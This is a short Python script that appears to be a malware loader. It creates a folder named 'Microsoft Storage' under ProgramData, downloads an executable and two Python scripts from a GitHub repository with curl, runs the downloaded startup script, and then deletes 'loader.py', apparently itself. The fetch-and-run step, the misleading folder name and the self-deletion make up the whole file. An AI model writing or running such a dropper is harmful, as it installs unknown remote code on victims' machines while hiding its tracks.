import os
import time

directory = "C:/ProgramData/Microsoft Storage"
os.makedirs(directory, exist_ok=True)
os.chdir(directory)


os.system("curl -O https://raw.githubusercontent.com/Fghthssss/BUSB/refs/heads/main/clo.exe")
os.system("curl -O https://raw.githubusercontent.com/Fghthssss/BUSB/refs/heads/main/file.py")
os.system("curl -O https://raw.githubusercontent.com/Fghthssss/BUSB/refs/heads/main/startup.py")

os.system("start C:/ProgramData/Microsoft Storage/startup.py")
time.sleep(1)
os.remove("C:/ProgramData/Microsoft Storage/loader.py")
